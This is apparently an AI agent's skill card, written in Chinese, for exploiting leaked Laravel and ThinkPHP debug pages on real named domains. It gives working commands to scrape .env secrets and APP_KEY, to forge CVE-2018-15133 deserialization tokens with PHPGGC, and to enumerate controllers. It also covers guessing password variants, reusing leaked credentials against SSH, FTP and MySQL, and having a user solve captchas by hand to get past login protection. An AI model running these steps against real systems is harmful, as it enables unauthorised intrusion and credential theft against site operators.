---
name: 幻页·渗
description: "Use when Laravel/ThinkPHP debug 泄露: Whoops .env 提取、控制器枚举。"
version: 1.0.0
created_by: agent
---
# PHP 框架 Debug 模式泄露利用（Laravel / ThinkPHP）

目标站点开 debug（生产环境异常页带完整堆栈）时，按本文档提取配置、枚举路由、判断系统状态。2026-08 在 8G/kk8 运营方基础设施（8gtg.vip Laravel + dy/red CRMEB ThinkPHP 6.1.1）实测。域内资产/凭据/堵死路径速查见 `references/8g-kk8-infra-map.md`。

通用 Ignition/Whoops/CVE-2021-3129 先走 `php-debug-mode-exploitation`，本卡补行号锁版本与实测挡板。

## Laravel（Whoops 异常页）

- **触发异常**：访问 auth 保护的接口（如 /api/user）→ `Route [login] not defined` 500 → Whoops 完整堆栈（200KB+）
- **提取 .env 全量**：异常页 Environment Variables 面板有 `$_SERVER` + **env 键值**（DB_PASSWORD/APP_KEY/DB_HOST 等）。解析：`<td>KEY</td><td><pre class="sf-dump">"<span class="sf-dump-str">VALUE</span>"`
- **APP_KEY 泄露后**：CVE-2018-15133（X-XSRF-TOKEN 反序列化 RCE）只适用 Laravel 5.5-5.6.30；6+ 不 unserialize。实测验证法：PHPGGC 生成 Laravel/RCE1/7/9 payload → 用 APP_KEY 按 Laravel Encrypter 格式（AES-256-CBC+HMAC，json{iv,value,mac} base64）加密 → 发 X-XSRF-TOKEN → 看异常页是否回显 `O:40:"Illuminate\Broadcasting\PendingBroadcast`（回显=unserialize 发生）。不回显=已修复，别死磕
- **版本判定**（无 composer.json 时）：① 异常页堆栈中间件链（fideloper/proxy TrustProxies=5.x-6.x；内置 TrustProxies=7+）② **行号指纹法（精确）**：从异常页取 `UrlGenerator.php on line N`（"Route [x] not defined" 抛错行）与 `RouteCollection.php on line M`（methodNotAllowed 抛错行），curl GitHub raw 各 tag（v5.5.50…v9.52.0）同文件比对行号 → 锁定大版本。实测：UrlGenerator 389 ≈ v5.8.38 的 388 → **Laravel 5.8.x**（行号差 ≤1 即可认定）；5.5=305 / 5.6=372 / 6.x=437 / 7.x=420 / 8.x=444 / 9.x=467。辅助：Authenticate.php:41/68、Kernel.php:116 交叉验证
- **Laravel 5.8.x 结论**：CVE-2018-15133 与 CVE-2021-3129 都不适用（5.8 已修 unserialize 且用 Whoops 非 Ignition）→ 无公开 RCE，APP_KEY 只能用于解密已拿到的加密 cookie（无登录功能的站则无用），及时止损转其他面
- **catch-all 路由站**：`/{code}` 有效→302，无效→"0"；带引号/特殊字符的 URL 被 nginx 路径层 404（SQL 注入被挡死，别浪费时间）
- nginx 常规挡：/.env、/composer.json、/vendor/*、/storage/*（404 即被挡）

## ThinkPHP 6（debug 异常页）

- **完整堆栈**：任何异常页 20-150KB，含 `控制器不存在:app\web\controller\Xxx`、代码路径、行号
- **多应用路由**：`/index.php?s=/<controller>/<action>`（默认应用）；URL 前缀式（/api/xxx）可能 nginx 重写到 api 应用。**同代码库多域名分派**：dy.embracedream.com=web 应用、red=/api 走 api 应用、dy-bg.embracedream.com 的 `/auth/login.html` 走 **admin 应用**（异常页堆栈显示 `/www/wwwroot/<site>/app/admin/controller/Auth.php`）→ 从任一入口的异常页可确认全部应用目录结构
- **控制器枚举**（"控制器不存在"异常作为 oracle）：存在但方法缺失→"方法不存在"；存在且执行→空响应/业务响应/其他异常。注意**空响应（0 字节）也是"存在"**（重定向或空输出）。**枚举必须带多 action**（index/login/list 三连扫）：只扫 /index 会漏掉无 index 方法的控制器（如 Auth 只有 login/doLogin/captcha）
- **success() vs error() 分支判断**：CRMEB 类系统 HttpTrait 的 error() 可能崩（如 `Undefined property: think\facade\App::$config`——TP6 App 门面无 config 属性），而 success() 正常 → **只有"成功"响应可确认**（正确密码=正常 JSON，错误=崩溃页，无法区分验证码错/密码错）
- **表缺失系统**：数据库表全缺（`Table 'db.br_xxx' doesn't exist`）→ 废弃安装；登录查询在验证码之后，验证码对才能看到表是否存在（SQL 错误页 vs 业务错误）
- **验证码**：/auth/captcha.html 图形码 tesseract 无效时发 MEDIA 给用户人工 OCR（用户可协助），同一 session cookie 复用。**验证码每次请求都刷新**（同 session 两次下载 md5 不同）→ 每次密码尝试都要新验证码，OCR 轮询成本高，控制尝试次数
- **异常页 POST 数据回显**：TP/Laravel debug 页的 Environment Variables 面板含 POST Data 表（`<td>account</td><td>admin</td>`）——可确认参数是否被接收、字段名是否正确；堆栈提取用 `at <abbr title="...">Class</abbr>->method()` 正则
- **密码模式分析**：相邻库名同模式（ssjkcom→watersjkcom=water+库名），新库名（dysjkcom）按同模式猜密码变体（waterdysjkcom）——失败即停，宝塔 MySQL 用户绑定 localhost 远程必拒

## 通用要点

- **信息收集链**：异常页 → .env → APP_URL 域名 → 源站 IP → 同服务器其他系统（FOFA domain/cert 反查）
- **IP 归属**：ip-api.com（中文）或 ipinfo.io；阿里云 AS37963/腾讯云 AS45090 是国内常见博彩运营方主机
- **端口面**：宝塔 8888（domain.conf Host 校验，Host 头伪造无效）、MySQL 3306（宝塔默认用户绑定 localhost，远程必拒）、SSH/FTP 密码复用（泄露密码变体试一轮即止，用户偏好爆破放最后）
- **CVE-2019-11043**：PHP-FPM PATH_INFO 注入；PHP 7.4+ 已修复（2026 年服务器基本免疫）；快速验证=发送 ?a=%0a×N 观察 502/500，全 200 即不适用

## Pitfalls

- Whoops/TP 异常页的 env 面板**键名两列显示**（Key|Value），值在 sf-dump span 里，正则要抓 `<span class="sf-dump-str">`
- 页面 dump 大（200KB+）时用 window 变量存 + 分块读取，别让 page_eval 返回值截断
- Cloudflare 对 curl 概率 409/空响应：走 frx-director 浏览器（page_eval fetch）最稳
- 验证码/密码尝试的响应全是崩溃页时，**无法用响应区分失败原因**——只有成功可确认，控制尝试次数

## 真源

- 手法：`传承/凤九歌·天地歌.md`
- 工具：`python3 炼蛊房/core_web_surface_probe.py --help`

---

## 快速命令集

### Laravel Whoops 异常页提取

```bash
# 触发异常（访问需要登录的接口）
curl -sk https://<目标>/api/user \
 -H 'Accept: application/json' | head -200

# 提取 .env 变量（Whoops 页面）
curl -sk https://<目标>/api/user | python3 -c "
import re, sys
content = sys.stdin.read()
# 提取 Environment Variables 面板中的键值对
pairs = re.findall(r'<td>([A-Z_]{3,30})</td>\s*<td><pre[^>]*>.*?sf-dump-str[^>]*>([^<]+)<', content, re.DOTALL)
for k, v in pairs:
 print(f'{k}={v}')
"

# APP_KEY 提取（Laravel 反序列化 RCE 前置）
curl -sk https://<目标>/api/user | grep -oE 'APP_KEY.*?base64:[^<"]+' | head -5

# 版本判定（行号指纹法）
# 获取 UrlGenerator.php 抛错行
curl -sk https://<目标>/api/nonexistent-route | \
 grep -oE 'UrlGenerator\.php on line [0-9]+' | head -3
# 5.5=305, 5.6=372, 5.8=389, 6.x=437, 7.x=420, 8.x=444, 9.x=467
```

### ThinkPHP 6 控制器枚举

```bash
# 枚举控制器（"控制器不存在" = oracle）
for ctrl in Login Auth User Admin Pay Order Config; do
 for action in index login list create detail; do
 resp=$(curl -sk "https://<目标>/index.php?s=/$ctrl/$action" \
 -H 'Accept: application/json' 2>/dev/null)
 if echo "$resp" | grep -q '控制器不存在'; then
 echo "MISS: $ctrl/$action"
 elif echo "$resp" | grep -q '方法不存在'; then
 echo "CTRL_EXISTS: $ctrl (no action $action)"
 else
 echo "HIT: $ctrl/$action -> $(echo "$resp" | head -c 100)"
 fi
 done
done

# 多应用路由（/api/ /admin/ /web/ 分派）
for app in api admin web user; do
 code=$(curl -sk -o /dev/null -w "%{http_code}" "https://<目标>/$app/")
 echo "$code https://<目标>/$app/"
done
```

### CVE-2018-15133 验证（Laravel 5.5-5.6.30）

```bash
# PHPGGC 生成 payload（需确认版本 5.5-5.6.30）
APP_KEY="<从 Whoops 提取的 APP_KEY>"

# 生成 RCE payload（验证 unserialize 是否发生）
phpggc Laravel/RCE1 system 'id' -b 2>/dev/null || \
 python3 -c "print('PHPGGC not installed: pip3 install phpggc or git clone')"

# 用 APP_KEY 加密（Laravel Encrypter 格式）
python3 -c "
import base64, json, os, hmac, hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

app_key_b64 = '<APP_KEY去掉base64:前缀>'
key = base64.b64decode(app_key_b64)

# PHPGGC payload（替换为实际生成的 payload）
payload = b'<phpggc_payload>'

iv = os.urandom(16)
cipher = AES.new(key, AES.MODE_CBC, iv)
value = base64.b64encode(cipher.encrypt(pad(payload, 16))).decode()
iv_b64 = base64.b64encode(iv).decode()
mac = hmac.new(key, f'{iv_b64}{value}'.encode(), hashlib.sha256).hexdigest()

token = base64.b64encode(json.dumps({'iv': iv_b64, 'value': value, 'mac': mac}).encode()).decode()
print('X-XSRF-TOKEN:', token)
"
```

### 数据库连接尝试（从 .env 获取凭据）

```bash
# MySQL（若 DB_HOST 暴露且非 localhost）
DB_HOST="<from .env>"
DB_PORT="3306"
DB_USER="<DB_USERNAME>"
DB_PASS="<DB_PASSWORD>"
DB_NAME="<DB_DATABASE>"

# 测试连接
python3 -c "
import pymysql
try:
 conn = pymysql.connect(host='$DB_HOST', port=$DB_PORT,
 user='$DB_USER', password='$DB_PASS',
 database='$DB_NAME', connect_timeout=5)
 cursor = conn.cursor()
 cursor.execute('SHOW TABLES')
 print('Tables:', [r[0] for r in cursor.fetchall()])
 conn.close()
except Exception as e:
 print('FAIL:', e)
"
```

### 证据写入

```bash
mkdir -p 案卷/<案卷>/php_debug/
# 保存 Whoops 页面（含 .env）
curl -sk https://<目标>/api/user > 案卷/<案卷>/php_debug/whoops_page.html
# 提取敏感变量
python3 -c "
import re
content = open('案卷/<案卷>/php_debug/whoops_page.html').read()
pairs = re.findall(r'<td>([A-Z_]{3,30})</td>.*?sf-dump-str[^>]*>([^<]+)<', content, re.DOTALL)
with open('案卷/<案卷>/php_debug/env_leak.txt','w') as f:
 for k,v in pairs:
 f.write(f'{k}={v}\n')
print('Extracted', len(pairs), 'variables')
"
```
